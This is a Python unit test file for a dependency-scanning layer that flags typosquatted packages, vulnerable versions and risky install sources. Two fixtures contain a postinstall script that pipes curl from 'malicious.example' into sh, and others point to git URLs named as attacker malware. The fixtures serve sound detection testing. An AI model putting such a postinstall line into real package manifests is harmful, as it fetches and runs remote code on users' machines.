"""Pruebas unitarias para la capa de dependencias (deps_layer.py)."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import httpx

from watchgate.core.layers.base import LAYER_REGISTRY
from watchgate.core.layers.deps_layer import (
    DependencyChange,
    DepsLayer,
    OSVCache,
    TyposquatChecker,
    parse_cargo_toml,
    parse_package_json,
    parse_pkgbuild,
    parse_requirements_txt,
)
from watchgate.core.models import CommitAuthor, FileChange, FileStatus, NormalizedDiff


def _make_diff(files: list[FileChange]) -> NormalizedDiff:
    return NormalizedDiff(
        base_sha="0000000000000000000000000000000000000000",
        head_sha="1111111111111111111111111111111111111111",
        repo_path="/tmp/fake_repo",
        files=files,
        commit_messages=["test commit"],
        authors=[CommitAuthor(name="Test User", email="test@example.com")],
    )


def test_deps_layer_registered() -> None:
    assert "dependencies" in LAYER_REGISTRY
    assert LAYER_REGISTRY["dependencies"] is DepsLayer


def test_no_manifests_changed() -> None:
    layer = DepsLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="src/main.py",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1 +1 @@\n-print('hello')\n+print('world')",
                additions=1,
                deletions=1,
            )
        ]
    )
    res = layer.analyze(diff, {})
    assert res.risk_score == 0
    assert res.justification == "No se han modificado manifiestos de dependencias."


def test_typosquatting_detection() -> None:
    layer = DepsLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="package.json",
                status=FileStatus.MODIFIED,
                diff_hunk='@@ -5,1 +5,2 @@\n "dependencies": {\n+  "1odash": "^4.17.21"\n }',
                additions=1,
                deletions=0,
            )
        ]
    )
    with patch.object(layer, "_query_osv_batch", return_value={0: ({}, None)}):
        res = layer.analyze(diff, {})
    assert res.risk_score >= 75
    assert "1odash" in res.justification
    assert "lodash" in res.justification


def test_osv_vulnerability_high() -> None:
    layer = DepsLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+vulnerable-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )
    osv_response = {
        "vulns": [
            {
                "id": "GHSA-1234-5678",
                "database_specific": {"severity": "HIGH"},
            }
        ]
    }

    with patch.object(layer, "_query_osv_batch", return_value={0: (osv_response, None)}):
        res = layer.analyze(diff, {})

    assert res.risk_score == 90
    assert "Vulnerabilidad crítica/alta" in res.justification


def test_osv_network_error_graceful() -> None:
    layer = DepsLayer(cache_db_path=":memory:")
    diff = _make_diff(
        [
            FileChange(
                path="requirements.txt",
                status=FileStatus.MODIFIED,
                diff_hunk="@@ -1,0 +1,1 @@\n+some-new-pkg==1.0.0",
                additions=1,
                deletions=0,
            )
        ]
    )

    with patch("httpx.post", side_effect=httpx.ConnectError("Connection refused")):
        res = layer.analyze(diff, {})

    assert res.risk_score == 10  # Score base de nueva dependencia, no elevado por error de red
    assert "No verificable por fallo de red" in res.justification


def test_osv_sqlite_cache() -> None:
    cache = OSVCache(db_path=":memory:")
    change = DependencyChange(ecosystem="npm", name="express", new_version="4.18.2")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {"vulns": []}

    with patch("httpx.post", return_value=mock_resp) as mock_post:
        layer = DepsLayer(cache_db_path=":memory:")
        layer.cache = cache

        # Primera consulta
        res1, err1 = layer._query_osv(change)
        assert err1 is None
        assert res1 == {"vulns": []}
        assert mock_post.call_count == 1

        # Segunda consulta (debe usar la caché)
        res2, err2 = layer._query_osv(change)
        assert err2 is None
        assert res2 == {"vulns": []}
        assert mock_post.call_count == 1  # No volvió a llamar a la red


def test_dangerous_install_script() -> None:
    layer = DepsLayer(cache_db_path=":memory:")
    diff_hunk = (
        '@@ -5,1 +5,3 @@\n'
        ' "scripts": {\n'
        '+  "postinstall": "curl http://malicious.example/install.sh | sh"\n'
        ' },\n'
        ' "dependencies": {\n'
        '+  "my-lib": "1.0.0"\n'
        ' }'
    )
    diff = _make_diff(
        [
            FileChange(
                path="package.json",
                status=FileStatus.MODIFIED,
                diff_hunk=diff_hunk,
                additions=2,
                deletions=0,
            )
        ]
    )
    with patch.object(layer, "_query_osv_batch", return_value={0: ({}, None)}):
        res = layer.analyze(diff, {})
    assert res.risk_score >= 80
    assert "Script de instalación sospechoso" in res.justification


def test_parsers() -> None:
    reqs = parse_requirements_txt("+\n+# comment\n+requests==2.28.1\n+urllib3>=1.26.5\n")
    assert len(reqs) == 2
    assert reqs[0].name == "requests"
    assert reqs[0].new_version == "2.28.1"
    assert reqs[1].name == "urllib3"

    cargo = parse_cargo_toml('+\n+tokio = "1.28.0"\n+serde = { version = "1.0" }\n')
    assert len(cargo) == 2
    assert cargo[0].name == "tokio"
    assert cargo[0].new_version == "1.28.0"
    assert cargo[1].name == "serde"

    pkgbuild = parse_pkgbuild("+\n+depends=('curl' 'openssl')\n")
    assert len(pkgbuild) == 2
    assert pkgbuild[0].name == "curl"
    assert pkgbuild[1].name == "openssl"


def test_typosquat_checker() -> None:
    checker = TyposquatChecker()
    is_ts, ref = checker.is_typosquatting("1odash", "npm")
    assert is_ts is True
    assert ref == "lodash"

    is_ts_valid, _ = checker.is_typosquatting("lodash", "npm")
    assert is_ts_valid is False


def test_git_url_dependency_parsing() -> None:
    # 1. requirements.txt con editable git URL y egg
    hunk_req = "+\n+-e git+https://github.com/attacker/fake-pkg.git#egg=numpy\n+my-pkg @ https://example.com/my-pkg.whl\n"
    reqs = parse_requirements_txt(hunk_req)
    assert len(reqs) == 2
    assert reqs[0].name == "numpy"
    assert reqs[0].is_direct_url is True
    assert reqs[1].name == "my-pkg"
    assert reqs[1].is_direct_url is True

    # 2. package.json con git commit / repo URL
    diff_hunk_pkg = (
        '@@ -1,3 +1,4 @@\n "optionalDependencies": {\n'
        '+  "shai-hulud-pkg": "git+https://github.com/attacker/malware.git#v1.0.0"\n }'
    )
    diff = _make_diff(
        [
            FileChange(
                path="package.json",
                status=FileStatus.MODIFIED,
                diff_hunk=diff_hunk_pkg,
                additions=1,
                deletions=0,
            )
        ]
    )
    layer = DepsLayer(cache_db_path=":memory:")
    with patch.object(layer, "_query_osv_batch", return_value={}):
        res = layer.analyze(diff, {})
    assert res.risk_score >= 75
    assert "Instalación directa desde URL/Git" in res.justification

    # 3. Cargo.toml con git
    cargo_hunk = (
        '+\n+my-crate = { git = "https://github.com/user/repo", branch = "main" }\n'
    )
    cargo = parse_cargo_toml(cargo_hunk)
    assert len(cargo) == 1
    assert cargo[0].name == "my-crate"
    assert cargo[0].is_direct_url is True


def test_osv_batch_query_and_cache() -> None:
    cache = OSVCache(db_path=":memory:")
    c1 = DependencyChange(ecosystem="PyPI", name="pkg1", new_version="1.0")
    c2 = DependencyChange(ecosystem="PyPI", name="pkg2", new_version="2.0")

    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "results": [
            {"vulns": []},
            {"vulns": [{"id": "CVE-2026-0001", "database_specific": {"severity": "HIGH"}}]},
        ]
    }

    layer = DepsLayer(cache_db_path=":memory:")
    layer.cache = cache

    with patch("httpx.post", return_value=mock_resp) as mock_post:
        res_batch = layer._query_osv_batch([c1, c2])
        assert len(res_batch) == 2
        assert mock_post.call_count == 1  # Exactamente 1 sola llamada HTTP batch POST
        req_json = mock_post.call_args.kwargs["json"]
        assert len(req_json["queries"]) == 2

        # Comprobar que ambas fueron guardadas en la caché SQLite
        cached_c1 = cache.get("pkg1", "PyPI", "1.0")
        cached_c2 = cache.get("pkg2", "PyPI", "2.0")
        assert cached_c1 == {"vulns": []}
        assert cached_c2 is not None and len(cached_c2["vulns"]) == 1

        # Segunda llamada con los mismos cambios debe usar la caché (0 peticiones HTTP nuevas)
        res_batch_cached = layer._query_osv_batch([c1, c2])
        assert len(res_batch_cached) == 2
        assert mock_post.call_count == 1


def test_osv_severity_precision_no_false_positives() -> None:
    from watchgate.core.layers.deps_layer import _is_high_or_critical_vuln

    # 1. Objeto con fecha "2023-09-10" sin severidad crítica/alta -> NO debe dar verdadero
    vuln_low = {
        "id": "GHSA-1111-2222",
        "summary": "Fix released on 2023-09-10 v1.9.0",
        "database_specific": {"severity": "MODERATE"},
        "severity": [{"type": "CVSS_V3", "score": "5.3"}],
    }
    assert _is_high_or_critical_vuln(vuln_low) is False

    # 2. Objeto con severidad alta explícita -> Debe dar verdadero
    vuln_high = {
        "id": "GHSA-3333-4444",
        "database_specific": {"github_reviewed_severity": "HIGH"},
    }
    assert _is_high_or_critical_vuln(vuln_high) is True

    # 3. Objeto con score CVSS 9.8 -> Debe dar verdadero
    vuln_crit = {
        "id": "GHSA-5555-6666",
        "database_specific": {"cvss": {"score": 9.8}},
    }
    assert _is_high_or_critical_vuln(vuln_crit) is True


def test_package_json_standalone_script() -> None:
    # Test para verificar scripts modificados en package.json sin cambio de dependencias
    hunk = (
        '@@ -1,3 +1,4 @@\n "scripts": {\n'
        '+  "postinstall": "curl http://malicious.example/sh | sh"\n }'
    )
    changes = parse_package_json(hunk)
    assert len(changes) == 1
    assert changes[0].name == "package.json (scripts)"
    assert "curl" in changes[0].install_script

    fc = FileChange(
        path="package.json",
        status=FileStatus.MODIFIED,
        diff_hunk=hunk,
        additions=1,
        deletions=0,
    )
    diff = _make_diff([fc])
    layer = DepsLayer(cache_db_path=":memory:")
    with patch.object(layer, "_query_osv_batch", return_value={}):
        res = layer.analyze(diff, {})
    assert res.risk_score >= 80
    assert "Script de instalación sospechoso" in res.justification


def test_typosquatting_underscore_normalization() -> None:
    checker = TyposquatChecker()
    # "aiograam" en PyPI vs "aiogram" / "aio_gram"
    is_ts, ref = checker.is_typosquatting("aio_graam", "PyPI")
    assert is_ts is True
    assert ref == "aiogram"
